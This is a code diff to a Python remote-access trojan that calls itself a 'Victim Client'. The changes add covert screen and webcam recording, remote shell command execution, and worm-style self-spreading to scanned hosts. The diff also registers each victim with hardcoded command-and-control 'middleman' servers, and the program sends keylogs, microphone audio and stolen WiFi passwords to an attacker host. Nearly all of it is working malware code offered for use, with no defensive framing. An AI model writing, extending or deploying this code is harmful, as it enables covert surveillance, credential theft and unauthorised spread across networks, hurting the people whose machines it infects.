@@ -108,7 +108,7 @@ def retreive_screenshot(conn):
     try:
         with mss.mss() as sct:
             monitor = sct.monitors[1]
-            WIDTH, HEIGHT = 600, 300
+            WIDTH, HEIGHT = 800, 450
 
             while True:
                 try:
@@ -120,7 +120,6 @@ def retreive_screenshot(conn):
                         pixels = zlib.compress(img_resized.tobytes())
                         size = len(pixels)
                         
-                        # Send in a single block to prevent partial sends
                         data = ((4).to_bytes(1, byteorder='big') + 
                                size.to_bytes(4, byteorder='big') + 
                                pixels)
@@ -175,21 +174,143 @@ def screen_sender(host='0.0.0.0', port=5001):
         time.sleep(1)  # Wait before retrying
 
 
+def send_file(client_socket, filename):
+    """Send a file to the middleman"""
+    try:
+        filesize = os.path.getsize(filename)
+        # Send file info
+        file_info = f"{os.path.basename(filename)}|{filesize}"
+        client_socket.send(file_info.encode('utf-8'))
+        time.sleep(0.1)  # Give receiver time to process
+        
+        # Send file data
+        with open(filename, 'rb') as f:
+            while True:
+                data = f.read(4096)
+                if not data:
+                    break
+                client_socket.send(data)
+        return True
+    except Exception as e:
+        print(f"Error sending file: {e}")
+        return False
+
+
+def record_screen(filename, duration):
+    """Record screen for specified duration"""
+    try:
+        with mss.mss() as sct:
+            monitor = sct.monitors[1]
+            width, height = 800, 450
+            
+            # Initialize video writer
+            fourcc = cv2.VideoWriter_fourcc(*'XVID')
+            out = cv2.VideoWriter(filename, fourcc, 30.0, (width, height))
+            
+            start_time = time.time()
+            while (time.time() - start_time) < float(duration):
+                # Capture screen
+                screenshot = sct.grab(monitor)
+                img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
+                img_resized = img.resize((width, height))
+                
+                # Convert to OpenCV format and write
+                frame = cv2.cvtColor(np.array(img_resized), cv2.COLOR_RGB2BGR)
+                out.write(frame)
+                
+                time.sleep(1/30)  # Cap at 30 FPS
+                
+            out.release()
+            return True
+    except Exception as e:
+        print(f"Error recording screen: {e}")
+        return False
+
+
+def record_camera(filename, duration):
+    """Record camera for specified duration"""
+    try:
+        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # Add cv2.CAP_DSHOW for Windows
+        if not cap.isOpened():
+            print("Failed to open camera")
+            return False
+            
+        width, height = 800, 450
+        fourcc = cv2.VideoWriter_fourcc(*'XVID')
+        out = cv2.VideoWriter(filename, fourcc, 30.0, (width, height))
+        
+        start_time = time.time()
+        while cap.isOpened() and (time.time() - start_time) < float(duration):
+            ret, frame = cap.read()
+            if not ret:
+                break
+                
+            # Resize frame
+            frame_resized = cv2.resize(frame, (width, height))
+            out.write(frame_resized)
+            
+            time.sleep(1/30)  # Cap at 30 FPS
+            
+        cap.release()
+        out.release()
+        return True
+    except Exception as e:
+        print(f"Error recording camera: {e}")
+        return False
+
+
 def handle_client(client_socket):
-    BUFFER_SIZE = 4096
+    """Handle client commands including recording"""
     while True:
         try:
-            command = client_socket.recv(BUFFER_SIZE).decode('utf-8')
-            if command.lower() == "exit":
-                print("Disconnected from client.")
+            command = client_socket.recv(1024).decode()
+            if not command:
                 break
-            output = subprocess.getoutput(command)
-            if not output:
-                output = "Command executed but no output."
-            client_socket.send(output.encode('utf-8'))
+                
+            if command.startswith("record_screen"):
+                try:
+                    _, duration, filename = command.split()
+                    client_socket.send("Recording screen started.".encode())
+                    
+                    # Record screen
+                    success = record_screen(filename, float(duration))
+                    if success and os.path.exists(filename):
+                        client_socket.send("Recording completed.".encode())
+                        # Send file through file transfer port
+                        send_file(client_socket, filename)
+                        # Clean up
+                        os.remove(filename)
+                    else:
+                        client_socket.send("Recording failed.".encode())
+                except Exception as e:
+                    client_socket.send(f"Error in screen recording: {e}".encode())
+                    
+            elif command.startswith("record_camera"):
+                try:
+                    _, duration, filename = command.split()
+                    client_socket.send("Recording camera started.".encode())
+                    
+                    # Record camera
+                    success = record_camera(filename, float(duration))
+                    if success and os.path.exists(filename):
+                        client_socket.send("Recording completed.".encode())
+                        # Send file through file transfer port
+                        send_file(client_socket, filename)
+                        # Clean up
+                        os.remove(filename)
+                    else:
+                        client_socket.send("Recording failed.".encode())
+                except Exception as e:
+                    client_socket.send(f"Error in camera recording: {e}".encode())
+                    
+            else:
+                output = subprocess.getoutput(command)
+                client_socket.send(output.encode() if output else "Command executed.".encode())
+                
         except Exception as e:
-            print(f"Error: {e}")
+            print(f"Error handling client: {e}")
             break
+            
     client_socket.close()
 
 
@@ -224,7 +345,7 @@ def capturevid(conn):
                 pass
             return
 
-        WIDTH, HEIGHT = 600, 300
+        WIDTH, HEIGHT = 800, 450
         while cap.isOpened():
             try:
                 ret, frame = cap.read()
@@ -297,21 +418,108 @@ def camsender(port=5002):
         time.sleep(1)  # Wait before retrying
 
 
-def send_file(conn, file_path):
+def spread_payload(target_host, target_port):
+    """Attempt to spread the payload to a vulnerable host."""
     try:
-        filename = os.path.basename(file_path)
-        filesize = os.path.getsize(file_path)
-        file_info = f"{filename}|{filesize}".encode('utf-8')
-        conn.sendall(file_info.ljust(1024))
-        with open(file_path, 'rb') as f:
-            while True:
-                bytes_read = f.read(4096)
-                if not bytes_read:
-                    break
-                conn.sendall(bytes_read)
-        print(f"[VICTIM]: File {filename} sent successfully!")
+        # Create a connection to the target
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(3)
+            s.connect((target_host, target_port))
+
+            # Get our own file content
+            with open(__file__, 'rb') as f:
+                payload = f.read()
+
+            # Send payload size first
+            size = len(payload)
+            s.send(size.to_bytes(4, byteorder='big'))
+
+            # Send the payload
+            s.sendall(payload)
+
+            print(f"Successfully spread to {target_host}:{target_port}")
+
     except Exception as e:
-        print(f"Error sending file: {e}")
+        print(f"Failed to spread to {target_host}:{target_port}: {e}")
+
+
+def start_spreading():
+    print("Starting network scanner...")
+    scanner = NetworkScanner()
+    scanner.start()
+
+    while True:
+        try:
+            scanner.scan_network()
+            vulnerable_hosts = scanner.victims
+
+            for host in vulnerable_hosts:
+                threading.Thread(
+                    target=spread_payload,
+                    args=(host, 5000),
+                    daemon=True
+                ).start()
+
+            time.sleep(10)  # Shorter delay between scans
+
+        except Exception as e:
+            print(f"Error in spreading routine: {e}")
+            time.sleep(5)
+
+
+def connect_to_middleman():
+    """Try to connect to available middleman servers"""
+    middleman_hosts = [
+        '10.0.2.15',      # NAT default middleman
+        '192.168.56.1',   # Host-only default middleman
+        '192.168.1.15',   # Bridge mode middleman
+        '10.0.3.15'       # NAT Network middleman
+    ]
+    middleman_port = 8080
+
+    # Get local IP address
+    local_ip = None
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        local_ip = s.getsockname()[0]
+        s.close()
+    except:
+        # If can't get IP, try alternative method
+        hostname = socket.gethostname()
+        local_ip = socket.gethostbyname(hostname)
+
+    if not local_ip:
+        print("Could not determine local IP")
+        return
+
+    # Try to connect to each middleman
+    for middleman_ip in middleman_hosts:
+        try:
+            print(f"Attempting to connect to middleman at {middleman_ip}...")
+            conn = HTTPConnection(middleman_ip, middleman_port, timeout=1)
+            headers = {'Content-type': 'application/json'}
+            data = {
+                'victim_ip': local_ip,
+                'ports': {
+                    'shell': 5000,
+                    'screen': 5001,
+                    'camera': 5002
+                }
+            }
+            conn.request('POST', '/new_victim', json.dumps(data), headers)
+            response = conn.getresponse()
+            if response.status == 200:
+                print(f"Successfully connected to middleman at {middleman_ip}")
+                print(f"Victim IP: {local_ip}")
+                print(f"Shell port: 5000")
+                print(f"Screen port: 5001")
+                print(f"Camera port: 5002")
+                return True
+        except Exception as e:
+            print(f"Failed to connect to middleman at {middleman_ip}: {e}")
+            continue
+    return False
 
 
 class NetworkScanner:
@@ -469,142 +677,76 @@ class NetworkScanner:
             self.scan_thread.join(timeout=1.0)
 
 
-def spread_payload(target_host, target_port):
-    """Attempt to spread the payload to a vulnerable host."""
-    try:
-        # Create a connection to the target
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.settimeout(3)
-            s.connect((target_host, target_port))
-
-            # Get our own file content
-            with open(__file__, 'rb') as f:
-                payload = f.read()
-
-            # Send payload size first
-            size = len(payload)
-            s.send(size.to_bytes(4, byteorder='big'))
-
-            # Send the payload
-            s.sendall(payload)
-
-            print(f"Successfully spread to {target_host}:{target_port}")
-
-    except Exception as e:
-        print(f"Failed to spread to {target_host}:{target_port}: {e}")
-
-
-def start_spreading():
-    print("Starting network scanner...")
-    scanner = NetworkScanner()
-    scanner.start()
-
-    while True:
-        try:
-            scanner.scan_network()
-            vulnerable_hosts = scanner.victims
-
-            for host in vulnerable_hosts:
-                threading.Thread(
-                    target=spread_payload,
-                    args=(host, 5000),
-                    daemon=True
-                ).start()
-
-            time.sleep(10)  # Shorter delay between scans
-
-        except Exception as e:
-            print(f"Error in spreading routine: {e}")
-            time.sleep(5)
-
-
-def connect_to_middleman():
-    """Try to connect to available middleman servers"""
-    middleman_hosts = [
-        '10.0.2.15',      # NAT default middleman
-        '192.168.56.1',   # Host-only default middleman
-        '192.168.1.15',   # Bridge mode middleman
-        '10.0.3.15'       # NAT Network middleman
-    ]
-    middleman_port = 8080
-
-    # Get local IP address
-    local_ip = None
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        local_ip = s.getsockname()[0]
-        s.close()
-    except:
-        # If can't get IP, try alternative method
-        hostname = socket.gethostname()
-        local_ip = socket.gethostbyname(hostname)
-
-    if not local_ip:
-        print("Could not determine local IP")
-        return
-
-    # Try to connect to each middleman
-    for middleman_ip in middleman_hosts:
-        try:
-            conn = HTTPConnection(middleman_ip, middleman_port, timeout=1)
-            headers = {'Content-type': 'application/json'}
-            data = {
-                'victim_ip': local_ip,
-                'ports': {
-                    'shell': 5000,
-                    'screen': 5001,
-                    'camera': 5002
-                }
-            }
-            conn.request('POST', '/new_victim', json.dumps(data), headers)
-            response = conn.getresponse()
-            if response.status == 200:
-                print(f"Successfully connected to middleman at {middleman_ip}")
-                return True
-        except Exception as e:
-            print(f"Failed to connect to middleman at {middleman_ip}: {e}")
-            continue
-    return False
-
-
 if __name__ == "__main__":
     options = parseargs()
     
+    print("\n=== Victim Client Starting ===")
+    print(f"Host: {options.host}")
+    print(f"Base port: {options.port}")
+    
     # Try to connect to middleman first
-    connect_to_middleman()
+    print("\nConnecting to middleman...")
+    if connect_to_middleman():
+        print("Successfully connected to middleman server")
+    else:
+        print("Failed to connect to any middleman server")
+    
+    print("\nStarting services...")
     
     if options.keylog == "t":
+        print("Starting keylogger...")
         logging.basicConfig(filename="Keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
         threadlog = threading.Thread(target=keylog)
         threadlog.start()
+        print("Keylogger started")
+        
     if options.micro > 0:
+        print("Starting microphone recording...")
         threadmic = threading.Thread(target=Microphone, args=(options.micro,))
         threadmic.start()
+        print("Microphone recording started")
+        
     if options.wifi == "t":
+        print("Retrieving WiFi passwords...")
         wifipass()
+        print("WiFi passwords retrieved")
+        
     if options.shell == "t":
+        print("Starting reverse shell...")
         threadshell = threading.Thread(target=R_tcp, args=(options.host, options.port))
         threadshell.start()
+        print(f"Reverse shell started on port {options.port}")
+        
     if options.screen == "t":
+        print("Starting screen streaming...")
         WIDTH = 600
         HEIGHT = 300
         threadscreen = threading.Thread(target=screen_sender, args=(options.host, options.port + 1))
         threadscreen.start()
+        print(f"Screen streaming started on port {options.port + 1}")
+        
     if options.camera == "t":
+        print("Starting camera streaming...")
         MAX_DGRAM = 2 ** 16
         MAX_IMAGE_DGRAM = MAX_DGRAM - 64
         threadcam = threading.Thread(target=camsender, args=(options.port + 2,))
         threadcam.start()
+        print(f"Camera streaming started on port {options.port + 2}")
     
     # Start spreading thread
+    print("\nStarting spreading mechanism...")
     spreading_thread = threading.Thread(target=start_spreading, daemon=True)
     spreading_thread.start()
+    print("Spreading mechanism started")
 
     # File transfer setup
+    print("\nSetting up file transfer...")
     attacker_host = '192.168.1.15'
     file_transfer_port = options.port + 3
     files_to_send = ["Keylog.txt", "record.wav", "wifis.txt"]
+    
+    print(f"File transfer port: {file_transfer_port}")
+    print("Files to send:", files_to_send)
     
     while True:
         try:
@@ -616,3 +758,5 @@ if __name__ == "__main__":
                 break
         except Exception as e:
             time.sleep(5)
+
+    print("\n=== Victim Client Running ===")
